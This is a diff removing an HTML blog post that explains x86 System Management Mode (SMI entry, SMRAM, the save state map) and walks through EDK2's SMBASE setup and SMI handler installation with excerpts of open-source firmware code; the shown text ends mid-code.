@@ -1,268 +1,503 @@
-<!doctype html><html lang=en><head><title>0xbekoo</title><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no"><meta name=theme-color content="#000084"><link rel=icon href=/favicon.ico><link rel=canonical href=/blogs/diving-deep-into-smm/><noscript><style>body{visibility:visible!important}</style></noscript></head><body><nav class="navbar navbar-inverse navbar-fixed-top"><div class=navbar-inner><div class=container><button type=button class="btn btn-navbar" data-toggle=collapse data-target=.nav-collapse></button>
-<a class=brand href=/>0xbekoo</a><div class="nav-collapse collapse"><ul class=nav><li><a href=/docs/><span>Documentation</span></a></li><li><a href=/blogs/><span>Blogs</span></a></li><li><a href=/projects/><span>Projects</span></a></li></ul></div></div></div></nav><div id=content class=container><article class="single-shell single-shell--blogs"><div class="row-fluid navmargin"><div class="page-header single-shell__header"><h1 class=single-shell__title>An In-Depth Look at the System Management Mode of Processors</h1><p class=single-shell__meta>Thu, Mar 26, 2026</p></div><div class="single-shell__body single-shell__body--with-toc"><div class=single-shell__main><section class="single-shell__author single-shell__author--mobile"><div class=single-shell__author-static aria-hidden=true></div><div class=single-shell__author-heading>About Author</div><div class=single-shell__author-card><a class=single-shell__author-photo-link href=https://github.com/0xbekoo><div class=single-shell__author-photo-shell><img class=single-shell__author-photo src=https://github.com/0xbekoo.png alt=0xbekoo></div></a><div class=single-shell__author-body><a class=single-shell__author-name-link href=https://github.com/0xbekoo><span class=single-shell__author-name data-text=0xbekoo>0xbekoo</span></a><p class=single-shell__author-title>Low-Level Security Researcher</p></div></div></section><section class="single-shell__toc single-shell__toc--mobile is-open" data-ui=toc><button class=single-shell__toc-toggle type=button aria-expanded=true aria-controls=single-toc-mobile-blogs-diving-deep-into-smm->
-<span class=single-shell__toc-label>Contents</span>
-<span class=single-shell__toc-status aria-hidden=true>[-]</span></button><div id=single-toc-mobile-blogs-diving-deep-into-smm- class=single-shell__toc-panel><div class=single-shell__toc-panel-inner><div class=single-shell__toc-body><nav id=TableOfContents-mobile><ul><li><ul><li><a href=#introduction><strong>Introduction</strong></a></li><li><a href=#system-management-mode-smm><strong>System Management Mode (SMM)</strong></a><ul><li><a href=#entering-smm-with-system-management-interrupt-smi><strong>Entering SMM with System Management Interrupt (SMI)</strong></a></li><li><a href=#system-management-ram-smram><strong>System Management RAM (SMRAM)</strong></a></li></ul></li><li><a href=#introduction-to-smm-in-edk2><strong>Introduction to SMM in EDK2</strong></a><ul><li><a href=#initializing-of-smbase-and-the-save-state-map><strong>Initializing of SMBASE and The Save State Map</strong></a></li><li><a href=#preparing-smi-handler-area><strong>Preparing SMI Handler Area</strong></a></li><li><a href=#handling-a-smi><strong>Handling a SMI</strong></a></li></ul></li><li><a href=#abyss-of-nun-project><strong>Abyss of Nun Project</strong></a><ul><li><a href=#stage-1-windows-prepares-the-hand-off><strong>Stage 1: Windows Prepares the Hand-off</strong></a></li><li><a href=#stage-2-dxe-bridges-the-data-into-smm><strong>Stage 2: DXE Bridges the Data into SMM</strong></a></li><li><a href=#stage-3-the-smm-driver-receives-the-buffer><strong>Stage 3: The SMM Driver Receives the Buffer</strong></a></li></ul></li><li><a href=#conclusion><strong>Conclusion</strong></a></li></ul></li></ul></nav></div></div></div></section><div class=single-shell__content><p>It&rsquo;s gonna be hard, I guess.</p><h3 id=introduction><strong>Introduction</strong></h3><p>Welcome to my journey into the underworld. In this blog, we’ll take an in-depth look at the “god mode” of processors. Grab your gas mask and follow me.</p><p>Recently I was really wondering what this SMM actually is, and I found myself diving into these primordial waters. What makes SMM particularly fascinating—and dangerous—is its absolute control over the system. Code running in SMM can access all memory, modify any data structure, and remain completely invisible to security software.</p><p>System Management Mode (SMM) is one of the most privileged execution modes in x86 architecture, operating at a level even higher than the operating system kernel or hypervisor. It&rsquo;s a special-purpose operating mode that provides an isolated execution environment for handling system-wide functions such as power management, hardware control, and proprietary OEM code.</p><p>The main reference for this blog comes from <strong>Intel X64 and IA-32 Architectures Software Developer’s Manual Volume 3C: System Programming Guide Part 3</strong> (Page 207).</p><h3 id=system-management-mode-smm><strong>System Management Mode (SMM)</strong></h3><p>As you can see from the introduction, this god-mode was designed to manage the entire system transparently. Unlike other rings we know, such as Ring 0 (Kernel Mode) from OS or Hypervisor, the System Management mode is the deepest ring on the processor:</p><div style=text-align:center><img src=/images/posts/smm-blog/rings.jpg></div><br><br><p>Also you can see that there&rsquo;s &lsquo;ME&rsquo; ring, however this is another topic and this ring isn&rsquo;t on the processor. In fact, the most powerful one is ME because it is an autonomous subsystem that has been incorporated in virtually all of Intel&rsquo;s processor chipsets. So if we can talk about the processor, the SMM is the deepest level on the processor. I will write a blog for this ME ring.</p><p>The SMM has special purposes to manage hardware, such as power-management, system hardware control etc, and this ring is isolated from other rings and intended for use only by system firmware. So with this isolation, it manages the entire system with full access. We cannot communicate with it from Ring 3 or even Ring 0! With this in mind, <strong>we can think of the main idea of SMM as an isolated processor environment from the OS that operates the system transparently.</strong></p><p>For the processor to enter SMM, a <strong>System Management Interrupt</strong> (SMI) request needs to be invoked. With the SMI request, the processor will stop the whole process and enter SMM immediately. I know this may look strange that the processor will stop the whole process and this means that when an SMI request is received, the OS will freeze.</p><p>Because the processor saves its current state when it enters SMM, then it jumps to a new space, aka SMRAM fields (We will see this in detail). In the SMM there are SMI handlers, which singular name is <strong>The system management software executive</strong> and the processor starts execution of the instructions from the SMI Handler. Each SMI Request corresponds to its SMI Handler. To better understand: here&rsquo;s an example:</p><div style=text-align:center><img src=/images/posts/smm-blog/diagram.png></div><br><br><p><strong>Physical Memory Region</strong> (SMRAM) holds the critical code and data of the SMI Handler. The processor jumps into the SMRAM space and executes the SMI request in the SMRAM. When an SMI Handler has completed its operations, the processor will execute an RSM (Resume) instruction to exit. This instruction can only be executed from SMM.</p><h4 id=entering-smm-with-system-management-interrupt-smi><strong>Entering SMM with System Management Interrupt (SMI)</strong></h4><p>The only way to enter SMM is by signaling an SMI through the SMI# pin on the processor or through an SMI message received through the APIC bus. When the processor enters SMM, the processor switches to a new address space and <strong>paging is disabled</strong>! Here we need to understand what this actually is.</p><h4 id=system-management-ram-smram><strong>System Management RAM (SMRAM)</strong></h4><p>System Management RAM provides SMM address space for SMI Handler&rsquo;s code and data. The default SMRAM size is 64 KBytes beginning at a base physical address in physical memory called the SMBASE. In Intel documentations, The SMBASE default value is <strong>0x30000</strong> and the processor looks for the first instruction of the SMI Handler at <strong>[SMIBASE + 0x8000]</strong>, while it stores its context in <strong>[SMBASE + 0xFE00]</strong>. Here&rsquo;s a table from Intel:</p><div style=text-align:center><img src=/images/posts/smm-blog/photo1.png></div><br><br><div style=text-align:center><img src=/images/posts/smm-blog/photo2.png></div><br><br><p>We can see the state save map. Control Register CR4 is completely cleared to all 0s when entering SMM, while the hidden segment descriptor information stored in segment registers. Especially Debug Registers (DR0 - DR3), the X87 FPU Registers or Control Register CR2 are not saved and restored when entering and exiting SMM.</p><h3 id=introduction-to-smm-in-edk2><strong>Introduction to SMM in EDK2</strong></h3><p>Since I don&rsquo;t have real silicon, I continued my research with EDK2 (for OvmfPkg). In this section we will take a closer look at SMM.</p><h4 id=initializing-of-smbase-and-the-save-state-map><strong>Initializing of SMBASE and The Save State Map</strong></h4><p>The SMBASE location is prepared by <strong>SmmCpuFeaturesInitializeProcessor()</strong> function in <strong>SmmCpuFeaturesLib.h</strong>. This function prepares the save state map and SMBASE locations:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>BOOLEAN mSmmCpuFeaturesSmmRelocated;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>VOID
-</span></span><span style=display:flex><span>EFIAPI
-</span></span><span style=display:flex><span><span style=color:#a6e22e>SmmCpuFeaturesInitializeProcessor</span> (
-</span></span><span style=display:flex><span>  IN UINTN                      CpuIndex,
-</span></span><span style=display:flex><span>  IN BOOLEAN                    IsMonarch,
-</span></span><span style=display:flex><span>  IN EFI_PROCESSOR_INFORMATION  <span style=color:#f92672>*</span>ProcessorInfo,
-</span></span><span style=display:flex><span>  IN CPU_HOT_PLUG_DATA          <span style=color:#f92672>*</span>CpuHotPlugData
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  AMD_SMRAM_SAVE_STATE_MAP  <span style=color:#f92672>*</span>CpuState;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// No need to configure SMBASE if SmBase relocation has been done.
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>mSmmCpuFeaturesSmmRelocated) {
-</span></span><span style=display:flex><span>    <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// Configure SMBASE.
-</span></span></span><span style=display:flex><span>    <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>    CpuState <span style=color:#f92672>=</span> (AMD_SMRAM_SAVE_STATE_MAP <span style=color:#f92672>*</span>)(UINTN)(
-</span></span><span style=display:flex><span>                 SMM_DEFAULT_SMBASE <span style=color:#f92672>+</span> SMRAM_SAVE_STATE_MAP_OFFSET
-</span></span><span style=display:flex><span>                 );
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((CpuState<span style=color:#f92672>-&gt;</span>x86.SMMRevId <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFF</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
-</span></span><span style=display:flex><span>      CpuState<span style=color:#f92672>-&gt;</span>x86.SMBASE <span style=color:#f92672>=</span> (UINT32)CpuHotPlugData<span style=color:#f92672>-&gt;</span>SmBase[CpuIndex];
-</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>      CpuState<span style=color:#f92672>-&gt;</span>x64.SMBASE <span style=color:#f92672>=</span> (UINT32)CpuHotPlugData<span style=color:#f92672>-&gt;</span>SmBase[CpuIndex];
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// No need to program SMRRs on our virtual platform.
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>Since the OvmfPkg is virtual platform, some operations may missing or different than a real silicon.</p><p>First of all, it check the <strong>mSmmCpuFeaturesSmmRelocated</strong> variable. This variable is set if <strong>gSmmBaseHobGuid</strong> is not null:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>SmmCpuFeaturesLib.c
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>EFI_STATUS
-</span></span><span style=display:flex><span>EFIAPI
-</span></span><span style=display:flex><span><span style=color:#a6e22e>MmCpuFeaturesLibConstructorCommon</span> (
-</span></span><span style=display:flex><span>  VOID
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// If gSmmBaseHobGuid found, means SmBase info has been relocated and recorded
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// in the SmBase array.
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  mSmmCpuFeaturesSmmRelocated <span style=color:#f92672>=</span> (BOOLEAN)(<span style=color:#a6e22e>GetFirstGuidHob</span> (<span style=color:#f92672>&amp;</span>gSmmBaseHobGuid) <span style=color:#f92672>!=</span> NULL);
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>If this variable has a value, it means that SMBASE has already been relocated, so there is no need to relocate it again.</p><p>The SMBASE pointer is calculated with hardcoded values. We already learned the offsets of SMBASE. It calculates <strong>0x30000</strong> value with <strong>0xFC00</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-h data-lang=h><span style=display:flex><span><span style=color:#75715e>// From UefiPayloadPkg/BlSupportSmm/BlSupportSmm.h
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#define  SMRAM_SAVE_STATE_MAP_OFFSET  0xFC00    </span><span style=color:#75715e>/// Save state offset from SMBASE
-</span></span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>// From MdePkg/Include/Register/Intel/SmramSaveStateMap.h
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#define SMRAM_SAVE_STATE_MAP_OFFSET  0xfc00
-</span></span></span></code></pre></div><p>The result we obtained is <strong>0x3FC00</strong>.</p><p>After that the save state map area is prepared by <strong>SmramAccessGetCapabilities()</strong> function in <strong>SmramInternal.c</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>EFI_STATUS
-</span></span><span style=display:flex><span><span style=color:#a6e22e>SmramAccessGetCapabilities</span> (
-</span></span><span style=display:flex><span>  IN OUT UINTN                 <span style=color:#f92672>*</span>SmramMapSize,
-</span></span><span style=display:flex><span>  IN OUT EFI_SMRAM_DESCRIPTOR  <span style=color:#f92672>*</span>SmramMap
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  GuidHob         <span style=color:#f92672>=</span> <span style=color:#a6e22e>GetFirstGuidHob</span> (<span style=color:#f92672>&amp;</span>gEfiSmmSmramMemoryGuid);
-</span></span><span style=display:flex><span>  DescriptorBlock <span style=color:#f92672>=</span> <span style=color:#a6e22e>GET_GUID_HOB_DATA</span> (GuidHob);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  BufferSize <span style=color:#f92672>=</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>NumberOfSmmReservedRegions <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span> (EFI_SMRAM_DESCRIPTOR);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>SmramMapSize <span style=color:#f92672>=</span> BufferSize;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (Index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; Index <span style=color:#f92672>&lt;</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>NumberOfSmmReservedRegions; Index<span style=color:#f92672>++</span>) {
-</span></span><span style=display:flex><span>    SmramMap[Index].PhysicalStart <span style=color:#f92672>=</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>Descriptor[Index].PhysicalStart;
-</span></span><span style=display:flex><span>    SmramMap[Index].CpuStart      <span style=color:#f92672>=</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>Descriptor[Index].CpuStart;
-</span></span><span style=display:flex><span>    SmramMap[Index].PhysicalSize  <span style=color:#f92672>=</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>Descriptor[Index].PhysicalSize;
-</span></span><span style=display:flex><span>    SmramMap[Index].RegionState   <span style=color:#f92672>=</span> DescriptorBlock<span style=color:#f92672>-&gt;</span>Descriptor[Index].RegionState;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>Again we encounter &lsquo;GuidHob&rsquo;. The area is preapred with this value. <strong>SmramAccessGetCapabilities()</strong> function populates the Save State Map field descriptors, as we can see.</p><h4 id=preparing-smi-handler-area><strong>Preparing SMI Handler Area</strong></h4><p>To understand how EDK2 prepares the SMI handler area, it is better to start from <strong>InitializeMpServiceData()</strong> in <strong>UefiCpuPkg/PiSmmCpuDxeSmm/MpService.c</strong>. After the page tables and per-CPU GDT/TSS tables are created, EDK2 installs one SMI entry stub for every logical processor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Create page tables
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  Cr3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>SmmInitPageTable</span> ();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  GdtTssTables <span style=color:#f92672>=</span> <span style=color:#a6e22e>InitGdt</span> (Cr3, <span style=color:#f92672>&amp;</span>GdtTableStepSize);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Install SMI handler for each CPU
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (Index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; Index <span style=color:#f92672>&lt;</span> mMaxNumberOfCpus; Index<span style=color:#f92672>++</span>) {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>InstallSmiHandler</span> (
-</span></span><span style=display:flex><span>      Index,
-</span></span><span style=display:flex><span>      (UINT32)mCpuHotPlugData.SmBase[Index],
-</span></span><span style=display:flex><span>      (VOID <span style=color:#f92672>*</span>)((UINTN)Stacks <span style=color:#f92672>+</span> (StackSize <span style=color:#f92672>+</span> ShadowStackSize) <span style=color:#f92672>*</span> Index),
-</span></span><span style=display:flex><span>      StackSize,
-</span></span><span style=display:flex><span>      (UINTN)(GdtTssTables <span style=color:#f92672>+</span> GdtTableStepSize <span style=color:#f92672>*</span> Index),
-</span></span><span style=display:flex><span>      gcSmiGdtr.Limit <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>,
-</span></span><span style=display:flex><span>      gcSmiIdtr.Base,
-</span></span><span style=display:flex><span>      gcSmiIdtr.Limit <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>,
-</span></span><span style=display:flex><span>      Cr3
-</span></span><span style=display:flex><span>      );
-</span></span><span style=display:flex><span>  }
-</span></span></code></pre></div><p>This loop is important because EDK2 does not install one shared entry point for all processors. Instead, it prepares a CPU-specific handler area for each CPU. Every call to <strong>InstallSmiHandler()</strong> passes the current CPU index, that CPU&rsquo;s relocated <strong>SMBASE</strong>, its SMM stack, its private GDT, the SMM IDT, and the page-table base <strong>Cr3</strong>.</p><p>The actual installation is performed in <strong>SmramSaveState.c</strong>. Here, <strong>InstallSmiHandler()</strong> writes the processor-specific descriptor into SMRAM, patches the handler template with runtime values, and copies the final bootstrap code to the real SMM entry address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  Psd <span style=color:#f92672>=</span> (PROCESSOR_SMM_DESCRIPTOR <span style=color:#f92672>*</span>)(VOID <span style=color:#f92672>*</span>)((UINTN)SmBase <span style=color:#f92672>+</span> SMM_PSD_OFFSET);
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>CopyMem</span> (Psd, <span style=color:#f92672>&amp;</span>gcPsd, <span style=color:#66d9ef>sizeof</span> (gcPsd));
-</span></span><span style=display:flex><span>  Psd<span style=color:#f92672>-&gt;</span>SmmGdtPtr  <span style=color:#f92672>=</span> (UINT64)GdtBase;
-</span></span><span style=display:flex><span>  Psd<span style=color:#f92672>-&gt;</span>SmmGdtSize <span style=color:#f92672>=</span> (UINT32)GdtSize;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>InitShadowStack</span> (CpuIndex, (VOID <span style=color:#f92672>*</span>)((UINTN)SmiStack <span style=color:#f92672>+</span> StackSize));
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Initialize values in template before copy
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  CpuSmiStack <span style=color:#f92672>=</span> (UINT32)((UINTN)SmiStack <span style=color:#f92672>+</span> StackSize <span style=color:#f92672>-</span> <span style=color:#66d9ef>sizeof</span> (UINTN));
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>PatchInstructionX86</span> (gPatchSmiStack, CpuSmiStack, <span style=color:#ae81ff>4</span>);
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>PatchInstructionX86</span> (gPatchSmiCr3, Cr3, <span style=color:#ae81ff>4</span>);
-</span></span><span style=display:flex><span>  <span style=color:#a6e22e>PatchInstructionX86</span> (gPatchSmbase, SmBase, <span style=color:#ae81ff>4</span>);
-</span></span><span style=display:flex><span>  gSmiHandlerIdtr.Base  <span style=color:#f92672>=</span> IdtBase;
-</span></span><span style=display:flex><span>  gSmiHandlerIdtr.Limit <span style=color:#f92672>=</span> (UINT16)(IdtSize <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Set the value at the top of the CPU stack to the CPU Index
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(UINTN <span style=color:#f92672>*</span>)(UINTN)CpuSmiStack <span style=color:#f92672>=</span> CpuIndex;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Copy template to CPU specific SMI handler location
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#a6e22e>CopyMem</span> (
-</span></span><span style=display:flex><span>    (VOID <span style=color:#f92672>*</span>)((UINTN)SmBase <span style=color:#f92672>+</span> SMM_HANDLER_OFFSET),
-</span></span><span style=display:flex><span>    (VOID <span style=color:#f92672>*</span>)gcSmiHandlerTemplate,
-</span></span><span style=display:flex><span>    gcSmiHandlerSize
-</span></span><span style=display:flex><span>    );
-</span></span></code></pre></div><p>Here, <strong>SMM_HANDLER_OFFSET</strong> is <strong>0x8000</strong>, so the code is copied to <strong>SMBASE + 0x8000</strong>. The <strong>PROCESSOR_SMM_DESCRIPTOR</strong> is placed at <strong>SMBASE + 0xFB00</strong>. In other words, EDK2 is preparing a per-CPU bootstrap trampoline inside SMRAM.</p><p>The actual code template is <strong>gcSmiHandlerTemplate</strong>, which comes from <strong>UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm</strong> in the x64 path. So at this stage, EDK2 is not dispatching the final firmware SMI handlers yet. It is only preparing the low-level entry environment that will run immediately after the processor enters SMM.</p><h4 id=handling-a-smi><strong>Handling a SMI</strong></h4><p>When an SMI is triggered, the processor starts executing the code that was copied to <strong>SMBASE + 0x8000</strong>. In the x64 path, that entry stub eventually transfers control to <strong>SmiRendezvous()</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-asm data-lang=asm><span style=display:flex><span>    <span style=color:#a6e22e>mov</span>     <span style=color:#66d9ef>rcx</span>, <span style=color:#66d9ef>rbx</span>
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span>     <span style=color:#66d9ef>rax</span>, <span style=color:#66d9ef>strict</span> <span style=color:#66d9ef>qword</span> <span style=color:#ae81ff>0</span>         <span style=color:#75715e>;   call    ASM_PFX(SmiRendezvous)
-</span></span></span><span style=display:flex><span>SmiRendezvousAbsAddr:
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>call</span>    <span style=color:#66d9ef>rax</span>
-</span></span></code></pre></div><p>This is the important connection: inside <strong>UefiCpuPkg</strong>, the first C routine that handles an incoming SMI is <strong>SmiRendezvous()</strong> in <strong>MpService.c</strong>.</p><p><strong>SmiRendezvous()</strong> first handles one-time SMM initialization for a CPU, then validates the SMI source, synchronizes the processors, and decides whether the current CPU will run the BSP path or the AP path:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>mSmmInitialized[CpuIndex]) {
-</span></span><span style=display:flex><span>    <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>    <span style=color:#75715e>// Perform InitializeSmm for CpuIndex
-</span></span></span><span style=display:flex><span>    <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>    <span style=color:#a6e22e>InitializeSmm</span> ();
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>RestoreCr2</span> (Cr2);
-</span></span><span style=display:flex><span>    mSmmInitialized[CpuIndex] <span style=color:#f92672>=</span> TRUE;
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  ValidSmi <span style=color:#f92672>=</span> <span style=color:#a6e22e>PlatformValidSmi</span> ();
-</span></span><span style=display:flex><span>  BspInProgress <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>mSmmMpSyncData<span style=color:#f92672>-&gt;</span>InsideSmm;
-</span></span><span style=display:flex><span>  ...
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (mSmmMpSyncData<span style=color:#f92672>-&gt;</span>BspIndex <span style=color:#f92672>==</span> CpuIndex) {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>BSPHandler</span> (CpuIndex, mSmmMpSyncData<span style=color:#f92672>-&gt;</span>EffectiveSyncMode);
-</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>APHandler</span> (CpuIndex, ValidSmi, mSmmMpSyncData<span style=color:#f92672>-&gt;</span>EffectiveSyncMode);
-</span></span><span style=display:flex><span>  }
-</span></span></code></pre></div><p>So the handler that really handles SMI entry inside <strong>UefiCpuPkg</strong> is <strong>SmiRendezvous()</strong>. One CPU is elected as BSP and executes <strong>BSPHandler()</strong>, while the other processors follow <strong>APHandler()</strong>.</p><p>Before <strong>PiSmmCore</strong> can run, it has to register its entry point. This is done through <strong>RegisterSmmEntry()</strong>, which stores the core callback in <strong>gSmmCpuPrivate->SmmCoreEntry</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>EFI_STATUS
-</span></span><span style=display:flex><span>EFIAPI
-</span></span><span style=display:flex><span><span style=color:#a6e22e>RegisterSmmEntry</span> (
-</span></span><span style=display:flex><span>  IN CONST EFI_SMM_CONFIGURATION_PROTOCOL  <span style=color:#f92672>*</span>This,
-</span></span><span style=display:flex><span>  IN EFI_SMM_ENTRY_POINT                   SmmEntryPoint
-</span></span><span style=display:flex><span>  )
-</span></span><span style=display:flex><span>{
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Record SMM Foundation EntryPoint, later invoke it on SMI entry vector.
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  gSmmCpuPrivate<span style=color:#f92672>-&gt;</span>SmmCoreEntry <span style=color:#f92672>=</span> SmmEntryPoint;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> EFI_SUCCESS;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>Later, in the BSP path, <strong>UefiCpuPkg</strong> invokes that registered entry point:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Perform the pre tasks
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#a6e22e>PerformPreTasks</span> ();
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>// Invoke SMM Foundation EntryPoint with the processor information context.
-</span></span></span><span style=display:flex><span>  <span style=color:#75715e>//
-</span></span></span><span style=display:flex><span>  gSmmCpuPrivate<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SmmCoreEntry</span> (<span style=color:#f92672>&amp;</span>gSmmCpuPrivate<span style=color:#f92672>-&gt;</span>SmmCoreEntryContext);
